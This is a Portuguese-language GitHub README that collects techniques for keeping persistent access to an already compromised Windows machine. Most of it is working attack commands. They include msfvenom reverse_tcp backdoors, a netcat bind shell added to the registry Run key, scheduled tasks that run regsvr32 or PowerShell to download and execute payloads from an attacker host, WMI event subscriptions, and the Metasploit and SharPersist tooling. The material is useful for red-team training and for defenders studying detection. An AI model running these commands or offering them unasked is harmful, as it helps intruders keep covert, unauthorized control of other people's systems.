# Awesome Windows Persistence

![829c15633cef94444c681910dfedd23b](https://user-images.githubusercontent.com/67444297/198659100-fbdb0b32-38b0-4ff6-a5ab-7ae305cf51cc.gif)

**Técnicas e táticas para manutenção de persistência em um alvo windows explorado.**

Eu sou o Stux e estarei constantemente atualizando este repositório com novas técnicas!

**Obs: Todos os processos de persistência deste repositório partem do princípio de que você já possua uma shell ou acesso ao ambiente e que já tenha realizado o processo de escalação de privilégios.**

## Sumário
 - [Persistence Service](https://github.com/Stuuxx/awesome-persistence#persistence-service)
 - [Persistence Registry](https://github.com/Stuuxx/awesome-persistence#persistence-registry)
 - [Netcat](https://github.com/Stuuxx/awesome-persistence#netcat)
 - [Schtasks](https://github.com/Stuuxx/awesome-persistence#schtasks)
 - [Schtasks-Log Events](https://github.com/Stuuxx/awesome-persistence#schtasks---log-events)
 - [WMIC](https://github.com/Stuuxx/awesome-persistence#wmic)
 - [Wmi-Persistence](https://github.com/Stuuxx/awesome-persistence#wmi-persistence)
 - [SharPersist](https://github.com/Stuuxx/awesome-persistence#sharpersist)


## Persistence Service

Introdução:

Essa técnica tem como objetivo criar um serviço persistente no windows explorado na qual executará diversas vezes o payload de conexão reversa.

Etapas:
- Colocar a sessão em background;
- Utilizar e configurar o módulo exploit/windows/local/persistence_service do metasploit;

Este módulo irá gerar e fazer upload de um executável para o host explorado, em seguida irá torná-lo um serviço persistente. Ele criará um novo serviço que iniciará a carga útil sempre que o serviço estiver em execução.
**É necessário privilégio de administrador ou de sistema!**
```bash
background
use exploit/windows/local/persistence_service
set SESSION 1
exploit
```
![persistence-service](https://user-images.githubusercontent.com/67444297/198635234-f2d8beb0-a0e3-416f-a1b4-ad49d98448ed.jpg)
- Abrir uma nova aba no terminal;
- Utilizar o multi/handler, configurar-lo e colocar para ouvir;
```bash
msfconsole -q
use multi/handler
set PAYLOAD windows/meterpreter/reverse_tcp
set LPORT 4444
ip a s
set LHOST SEUIP
exploit
```
![persistence-service2](https://user-images.githubusercontent.com/67444297/198635249-b51498b3-7cc6-4cc5-9849-4b143b71e1de.jpg)
Note que logo que você colocar para ouvir o multi/handler, já receberá uma nova shell, isso se da ao fato de que essa técnica é voltada a um serviço persistente, ou seja, está executando o payload diversas vezes enquanto está vivo.

Para prova de conceito, iremos dar um reboot na máquina explorada e aguardar a shell em nosso multi/handler.
![persistence-service3](https://user-images.githubusercontent.com/67444297/198635260-54025d20-366e-4e76-a31e-1731e7da1702.jpg)



## Persistence Registry

-- Em construção -- 



## Netcat

Introdução:

Nessa técnica, iremos realizar o upload do netcat para o alvo e iremos modificar um registro para que o alvo execute ele, nos abrindo uma porta para conectar posteriormente quando necessário.

Etapas:
- Vamos realizar o upload do netcat para algum diretório do alvo.
```bash
upload /usr/share/windows-binaries/nc.exe C:\\windows\\system32
```
![nc1](https://user-images.githubusercontent.com/67444297/198689309-274f2c78-f4f0-45b0-b2e8-4eb9884615a9.jpg)

- Após realizado o upload, iremos modificar o registro para que o Netcat seja executado.
```bash
reg setval -k HKLM\\software\\microsoft\\windows\\currentversion\\run -v nc -d 'C:\windows\system32\nc.exe -Ldp 443 -e C:\windows\system32\cmd.exe'
```
![nc2](https://user-images.githubusercontent.com/67444297/198689312-33e81bea-6fec-43e7-bb09-fbe4b3c3bfea.jpg)

- Agora, iremos verificar como ficou nossa modificação.
```bash
reg queryval -k HKLM\\software\\microsoft\\windows\\currentversion\\run -v nc
```
![nc3](https://user-images.githubusercontent.com/67444297/198689313-1abd224e-cd03-4853-9958-65540a2cdb16.jpg)

Para prova de conceito, iremos dar um reboot na máquina explorada para que nosso ataque seja efetivado nos registros do sistema.

![nc4](https://user-images.githubusercontent.com/67444297/198689314-683654df-041d-453d-bec6-be6f419130ec.jpg)

- Após o ataque ser bem sucedido, vamos nos conectar na máquina explorada através do netcat.
```bash
nc IP PORTA
```
![nc5](https://user-images.githubusercontent.com/67444297/198689315-99ce1fe9-5608-4374-b861-b48f09492a57.jpg)



## Schtasks

Introdução:

Nessa técnica, iremos utilizar como backdoor o módulo do metasploit chamado "Script Web Delivery". Este módulo aciona rapidamente um servidor web que serve uma carga útil. O módulo fornecerá um comando a ser executado na máquina de destino com base no destino selecionado. O comando fornecido baixará e executará uma carga útil usando um interpretador de linguagem de script especificado ou "squablydoo" via regsvr32.exe para ignorar a lista de permissões do aplicativo. Usaremos o link gerado para criar uma tarefa que acionará o link malicioso toda vez que o login do usuário no sistema for realizado.

Etapas:
- No metasploit, iniciaremos o módulo "Script Web Delivery", vamos configurar-lo e copiar o link gerado.
```bash
use multi/script/web_delivery
set PAYLOAD windows/x64/meterpreter/reverse_tcp
set TARGET 3
set LHOST SEUIP
exploit
```

![Screenshot_1](https://user-images.githubusercontent.com/67444297/198840163-b4093e55-9bd5-4415-8661-d2d948e17617.png)

![Screenshot_2](https://user-images.githubusercontent.com/67444297/198840164-e098778b-876f-4e8f-84b3-72ed94aa199a.png)

- No meterpreter, vamos carregar a extensão powershell e criar a tarefa de execução do link malicioso gerado no web delivery.
```bash
load powershell
powershell_shell
schtasks /create /tn AttackDefense /tr "c:\windows\system32\WindowsPowerShell\v1.0\powershell.exe -WindowStyle hidden -NoLogo -NonInteractive -ep bypass -nop -c 'regsvr32 /s /n /u /i:http://10.10.23.3:8080/kpTJ2uK6kYL.sct scrobj.dll'" /sc onlogon /ru System
```
**Note que, o link acima deve ser substituído pelo o que você gerou.**

![Screenshot_3](https://user-images.githubusercontent.com/67444297/198840166-cd90afff-b811-4065-9ba3-70d9c79a815d.png)

Para prova de conceito, iremos dar um reboot na máquina explorada para que nossa tarefa seja executada.

![Screenshot_4](https://user-images.githubusercontent.com/67444297/198840167-3532082f-3dca-4e0c-b002-3eee09218f46.png)

- E então, visualizamos novamente a aba com o web_delivery na qual receberemos nossa shell.

![Screenshot_5](https://user-images.githubusercontent.com/67444297/198840168-3b5f04a7-1f47-464d-bfd8-96d8c22f2aa8.png)





## Schtasks - Log Events

Introdução:

Nesse caso, estamos criando uma tarefa que pode ser acionada em um log de segurança específico do Windows event. Ou seja, ID do event: 4634 (4634: event desconectado de uma conta). Quando um usuário faz logoff, então este event é gerado. Portanto, a tarefa agendada é executada assim que o usuário fizer login novamente.

Etapas:
- Vamos iniciar criando um backdoor via msfvenom.
```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=SEUIP LPORT=4444 -f exe > backdoor.exe
```
![Screenshot_1](https://user-images.githubusercontent.com/67444297/198754911-1b1001ce-e154-4982-8f9b-158cdc15d4e4.jpg)

- No meterpreter, iniciaremos a shell e criaremos a task através do schtasks setando o nosso backdoor.
```bash
shell
schtasks /Create /TN SessionOnLogOff /TR C:\Windows\System32\backdoor.exe /SC ONEVENT /EC Security /MO "*[System[(Level=4 or Level=0) and (EventID=4634)]]"
```
![Screenshot_3](https://user-images.githubusercontent.com/67444297/198754915-d0c88527-cc5e-4c89-8a71-df76edbc8bc6.jpg)
- Iniciaremos o multi/handler para receber a shell.
```bash
msfconsole -q
use multi/handler
set PAYLOAD windows/meterpreter/reverse_tcp
set LPORT 4444
ip a s
set LHOST SEUIP
exploit
```
![Screenshot_2](https://user-images.githubusercontent.com/67444297/198754914-cfa45c52-0dea-41f2-a8cf-a60855680d89.jpg)

Para prova de conceito, iremos dar um reboot na máquina explorada para que nosso ataque seja efetivado e a task seja executada.

![Screenshot_4](https://user-images.githubusercontent.com/67444297/198754918-e532b2a5-337c-48b7-a08c-7c61862dac6c.jpg)

- Após o reboot, receberemos nossa shell.

![Screenshot_5](https://user-images.githubusercontent.com/67444297/198754920-67ffe450-596a-4dfc-8736-8e5eed3ca16e.jpg)





## WMIC

Introdução:

Utilizaremos o WMIC do Windows para criar uma instância "EventFilter" e uma "EventConsumer" com a classe "CommandLineEventConsumer" para executar nosso backdoor de forma contínua e no final registraremos o evento de forma permanente.

Etapas:

- Iniciaremos criando o nosso backdoor através do msfvenom.
```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=SEUIP LPORT=4444 -f exe > backdoor.exe
```
![Screenshot_1](https://user-images.githubusercontent.com/67444297/198846885-92bb566d-63f2-4a50-9c3f-48a7af5e341f.jpg)

- Logo após, no meterpreter, iremos realizar o upload do backdoor.exe para um diretório temporário.

![Screenshot_2](https://user-images.githubusercontent.com/67444297/198846887-2dc82c3c-d42a-4ccb-97c1-8e1104fc346c.jpg)

- E então chegou o momento de criarmos as instâncias através do wmic, no meterpreter, iniciaremos a shell e então iniciaremos o processo.
```bash
shell
```

- Criar a instância EventFilter.

```bash
wmic /NAMESPACE:"\\root\subscription" PATH __EventFilter CREATE Name="AttackDefense", EventNameSpace="root\cimv2",QueryLanguage="WQL", Query="SELECT * FROM __InstanceModificationEvent WITHIN 10 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System'"
```

- Criar a instância EventConsumer e usar a classe CommandLineEventConsumer.

```bash
wmic /NAMESPACE:"\\root\subscription" PATH CommandLineEventConsumer CREATE Name="AttackDefense", ExecutablePath="C:\Users\Administrator\AppData\Local\Temp\backdoor.exe",CommandLineTemplate="C:\Windows\system32\backdoor.exe"
```

- Registrar o evento permanentemente.

```bash
wmic /NAMESPACE:"\\root\subscription" PATH __FilterToConsumerBinding CREATE Filter="__EventFilter.Name=\"AttackDefense\"", Consumer="CommandLineEventConsumer.Name=\"AttackDefense\""
```
![Screenshot_3](https://user-images.githubusercontent.com/67444297/198846888-d97bc179-1486-402a-805e-d43d2b907fff.jpg)

- Logo após a configuração do evento de persistência, iremos iniciar o multi/handler.

```bash
msfconsole -q
use multi/handler
set PAYLOAD windows/meterpreter/reverse_tcp
set LPORT 4444
ip a s
set LHOST SEUIP
exploit
```
![Screenshot_4](https://user-images.githubusercontent.com/67444297/198846891-f42798d1-97ed-45f9-a44c-6da7973fde57.jpg)

Para prova de conceito, iremos dar um reboot na máquina explorada para receber a shell no multi/handler.

![Screenshot_6](https://user-images.githubusercontent.com/67444297/198846894-ee1c6ad0-7628-42b0-8d53-299bf1cc407c.jpg)

- Após o reboot, podemos visualizar a shell em nosso multi/handler.

![Screenshot_5](https://user-images.githubusercontent.com/67444297/198846893-5c177855-04cd-4c0f-8db1-05748817994a.jpg)

## Wmi-Persistence

Introdução:

O script WMI-Persistence serve para criar assinaturas de eventos WMI maliciosas, através do upload desse script powershell para a máquina explorada, iremos realizar o processo de persistência.

Para realizar o download do WMI-Persistence.ps1 [clique aqui.](https://github.com/subesp0x10/Wmi-Persistence)

Etapas:
- Vamos iniciar gerando um backdoor através do msfvenom.
```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=SEUIP LPORT=4444 -f exe > backdoor.exe
```
![Screenshot_2](https://user-images.githubusercontent.com/67444297/198842746-8fcddb07-b4de-4b5b-b1ea-90dff3e80e4e.jpg)

- Vamos realizar o upload do backdoor para um diretório temporário do usuário de Administrador.

![Screenshot_3](https://user-images.githubusercontent.com/67444297/198842747-c513dffb-76d2-456b-933a-473f8312ce58.jpg)

- Agora, iremos iniciar um servidor http para realizar o donwload do WMI-Persistence.ps1 na máquina explorada.

![Screenshot_4](https://user-images.githubusercontent.com/67444297/198842748-aac5ad0f-aa7e-4f50-9a0f-9150f9229b36.jpg)

- No meterpreter, vamos carregar a extensão do powershell e iniciar.
- Também realizaremos o download do WMI-Persistence e instalaremos o nosso backdoor.
```bash
load powershell
powershell_shell
iex (New-Object Net.WebClient).DownloadString('http://10.10.22.3/WMI-Persistence.ps1')
Install-Persistence -Trigger Startup -Payload "\Users\Administrator\AppData\Local\Temp\backdoor.exe"
```
![Screenshot_6](https://user-images.githubusercontent.com/67444297/198842749-130f1e87-a357-4b97-b293-989ae50a22aa.jpg)

- Agora, iremos colocar o multi/handler para escutar e receber a shell.
```bash
msfconsole -q
set PAYLOAD windows/meterpreter/reverse_tcp
set LHOST SEUIP
set LPORT 4444
exploit
```

![Screenshot_7](https://user-images.githubusercontent.com/67444297/198842750-dd90ada1-247f-492d-9321-50252a435058.jpg)

Para prova de conceito, iremos dar um reboot na máquina explorada para recebermos nossa shell.

![Screenshot_8](https://user-images.githubusercontent.com/67444297/198842752-cf12ffe2-1d88-45d6-a38b-0c4c04c701ce.jpg)

- Logo após o reboot, receberemos nossa shell no multi/handler.

![Screenshot_9](https://user-images.githubusercontent.com/67444297/198842754-83093da4-0d80-4a32-8e86-0e8cb2956a0f.jpg)





## SharPersist

Introdução:

SharPersist é um kit de ferramentas de persistência do Windows escrito em C#. Suporta toneladas de técnicas diferentes para manutenção de persistência.
Para realizar o download do SharPersist [clique aqui.](https://github.com/mandiant/SharPersist/releases/tag/v1.0.1)

Etapas:
- Vamos iniciar criando um backdoor através do msfvenom.
```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=SEUIP LPORT=4444 -f exe > backdoor.exe
```
![Screenshot_1](https://user-images.githubusercontent.com/67444297/198844773-73f18f85-cfb4-4020-92c5-ef1b493bad7e.jpg)

- No meterpreter, vamos realizar o upload do backdoor e do SharPersist.exe para um diretório temporário.

![Screenshot_2](https://user-images.githubusercontent.com/67444297/198844774-bb86e4fa-91ef-43ee-aa3b-18f74bbb26fc.jpg)

- Agora iremos carregar a extensão do powershell e iremos criar uma tarefa agendada através do SharPersist.exe.
```bash
load powershell
powershell_shell
./SharPersist.exe -t schtask -c "C:\Windows\System32\cmd.exe" -a "/c \Users\Administrator\AppData\Local\Temp\backdoor.exe" -n "AttackDefense" -m add -o logon
```
![Screenshot_3](https://user-images.githubusercontent.com/67444297/198844776-d98a0b32-2db7-428c-9c27-d4756538bce0.jpg)

- Em outra aba, iniciaremos o multi/handler para receber a shell.
```bash
msfconsole -q
set PAYLOAD windows/meterpreter/reverse_tcp
set LHOST SEUIP
set LPORT 4444
exploit
```
![Screenshot_4](https://user-images.githubusercontent.com/67444297/198844778-e39d9d12-9de7-4766-9c1b-ec9137305a60.jpg)

Para prova de conceito, iremos dar um reboot na máquina explorada para recebermos nossa shell no multi/handler.

![Screenshot_5](https://user-images.githubusercontent.com/67444297/198844924-f62b40dc-e902-44a4-be9f-3ac0b1722686.jpg)

- E então, recebemos nossa shell no multi/handler.

![Screenshot_6](https://user-images.githubusercontent.com/67444297/198844780-e2b39e76-1f5c-4957-9ae2-bf44a1b0e8bc.jpg)

## Roadmap
 - Persistence Registry
 - RDP
 - ...

## Ficou com alguma dúvida?
Sinta-se a vontade para entrar em contato comigo através de minhas redes sociais!
 - LinkedIn : [Eduardo Maragno](https://www.linkedin.com/in/eduardo-maragno/)
 - Bugcrowd : [@Stux](https://bugcrowd.com/StuxRs)
 - Medium : [@Stux](https://medium.com/@stux)
 - Twitter : [@StuxRs](https://twitter.com/StuxRs)
